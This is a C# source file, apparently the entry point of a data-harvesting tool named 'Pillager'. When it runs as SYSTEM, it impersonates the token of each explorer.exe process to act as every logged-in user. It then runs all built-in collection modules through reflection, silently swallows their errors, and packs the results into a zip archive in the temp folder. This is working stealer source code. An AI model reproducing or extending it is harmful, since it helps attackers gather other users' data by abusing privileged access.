using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Pillager.Helper;

namespace Pillager
{
    internal class Program
    {
        static string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
        static string logpath = Path.Combine(savepath, "Pillager.log");
        static string savezippath = savepath + ".zip";
        [STAThread]
        static void Main(string[] args)
        {
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            if (Environment.UserName.ToLower() == "system")
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName.ToLower() == "explorer" && Methods.ImpersonateProcessToken(p.Id))
                    {
                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p));
                        Directory.CreateDirectory(usersavepath);
                        SaveAll(usersavepath);
                        Native.RevertToSelf();
                    }
                }
            }
            else
            {
                SaveAll(savepath);
            }

            SaveAllOnce(savepath);

            //Zip
            using (ZipStorer zip = ZipStorer.Create(savezippath))
            {
                foreach (var item in Directory.GetDirectories(savepath))
                    zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
                foreach (var item in Directory.GetFiles(savepath))
                    zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
            }
            Directory.Delete(savepath, true);
        }

        static void SaveAll(string savepath)
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(ICommand)))
                {
                    File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
                    try
                    {
                        var instance = (ICommand)Activator.CreateInstance(type);
                        instance.Save(savepath);
                    }
                    catch { }
                    File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
                }
            }
        }

        static void SaveAllOnce(string savepath)
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(ICommandOnce)))
                {
                    File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
                    try
                    {
                        var instance = (ICommandOnce)Activator.CreateInstance(type);
                        instance.Save(savepath);
                    }
                    catch { }
                    File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
                }
            }
        }
    }
}
